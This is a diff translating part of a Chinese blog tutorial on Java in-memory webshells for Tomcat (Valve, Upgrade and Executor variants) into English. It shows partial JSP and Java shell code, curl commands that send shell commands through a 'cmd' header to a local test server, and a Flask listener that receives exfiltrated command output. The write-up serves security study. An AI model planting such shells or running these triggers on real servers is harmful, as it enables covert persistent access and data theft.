 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130164016715.png)
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130164029228.png)
 
-下面的则是调用 `standardContext.getPipeline().addValve`实现的：
+The following is implemented by calling `standardContext.getPipeline().addValve`:
 
 ```jsp
 <%@ page import="java.lang.reflect.Field" %>
@@ -3272,15 +3275,15 @@ modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);
 %>
 ```
 
-效果如下：
+The effects are as follows:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130164109133.png)
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130164219944.png)
 
-## 5.2 Tomcat Upgrade内存马
+## 5.2 Tomcat Upgrade Memory Horse
 
-由`2.14.2`节中的分析，我们可以写出如下`java`代码：
+From the analysis in Section 2.14.2, we can write the following `java` code:
 
 ```java
 package org.example;
@@ -3377,11 +3380,11 @@ public class TestUpgrade extends HttpServlet {
 }
 ```
 
-运行之后执行命令`curl -H "Connection: Upgrade" -H "Upgrade: hello" -H "cmd: dir" http://localhost:8080/evil`，结果如下：
+After running, execute the command `curl -H "Connection: Upgrade" -H "Upgrade: hello" -H "cmd: dir" http://localhost:8080/evil`, and the result is as follows:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131162725549.png)
 
-`jsp`版本为：
+The `jsp` version is:
 
 ```jsp
 <%@ page import="java.lang.reflect.Field" %>
@@ -3453,7 +3456,7 @@ public class TestUpgrade extends HttpServlet {
 %>
 ```
 
-启动项目之后执行以下两条命令：
+After starting the project, execute the following two commands:
 
 ```powershell
 curl http://localhost:8080/666.jsp
@@ -3462,9 +3465,9 @@ curl -H "Connection: Upgrade" -H "Upgrade: hello" -H "cmd: dir" http://localhost
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131164918339.png)
 
-## 5.3 Tomcat Executor内存马
+## 5.3 Tomcat Executor Memory Horse
 
-由`2.15.2.3`的分析，我们可以写出下面的内存马：
+From the analysis of `2.15.2.3`, we can write the following memory horse:
 
 ```jsp
 <%@ page import="org.apache.tomcat.util.net.NioEndpoint" %>
@@ -3614,17 +3617,17 @@ curl -H "Connection: Upgrade" -H "Upgrade: hello" -H "cmd: dir" http://localhost
 %>
 ```
 
-关于上面的内存马的分析，请参考下面这篇文章：
+For the above analysis of memory horses, please refer to the following article:
 
 > https://mp.weixin.qq.com/s/cU2s8D2BcJHTc7IuXO-1UQ
 
-效果：
+Effect:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202183738506.png)
 
-需要注意的是，原文中的代码没有考虑到命令输出结果中含有中文等字符的情况，所以需要`url`编码，这一点我在上面的代码中已改进。
+It should be noted that the code in the original text does not take into account the situation where the command output results contain Chinese characters, so the `url` encoding is required, which I have improved in the above code.
 
-当然，如果目标条件运行，你也可以利用`yakit`直接外带出来，`jsp`代码如下：
+Of course, if the target condition is running, you can also use `yakit` to take it out directly. The `jsp` code is as follows:
 
 ```jsp
 <%@ page import="org.apache.tomcat.util.net.NioEndpoint" %>
@@ -3803,19 +3806,19 @@ curl -H "Connection: Upgrade" -H "Upgrade: hello" -H "cmd: dir" http://localhost
 %>
 ```
 
-先开启监听：
+Turn on the monitor first:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202184234403.png)
 
-然后发送两次数据包，第一次是为了访问`888.jsp`，第二次是为了执行命令：
+Then send the packet twice, the first time is to access `888.jsp`, and the second time is to execute the command:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202193456383.png)
 
-可以看到数据已经传输过来了：
+You can see that the data has been transferred:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202193525085.png)
 
-当然，用`yakit`自带的这个是有缺陷的，就是不能持续接受，因为不能返回自定义的状态码，因此我们可以`python`自己写一个：
+Of course, the one that comes with `yakit` is flawed, it cannot be accepted continuously, because it cannot return a custom status code, so we can write one by `python`:
 
 ```python
 from flask import Flask, request
@@ -3835,17 +3838,17 @@ if __name__ == '__main__':
     app.run(debug=True)
 ```
 
-然后修改`jsp`代码中的`url`：
+Then modify the url in the `jsp` code:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202194338906.png)
 
-最后效果如下：
+The final effect is as follows:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202194418057.png)
 
-# 六、致谢
+# 6. Thanks
 
-我在学习Java内存马的过程中阅读参考引用了以下文章，每篇文章都或多或少地给予了我帮助与启发，于是在此一并列出，以表我诚挚的谢意：
+I read the following articles in the process of learning Java memory horses. Each article has more or less helped and inspired me, so I listed it here to express my sincere gratitude:
 
 ```
 https://zhuanlan.zhihu.com/p/634697114
@@ -3926,4 +3929,3 @@ https://xz.aliyun.com/t/12949
 https://paoka1.top/2023/04/21/Tomcat-WebSocket-型内存马/
 https://mp.weixin.qq.com/s/cU2s8D2BcJHTc7IuXO-1UQ
 ```
-
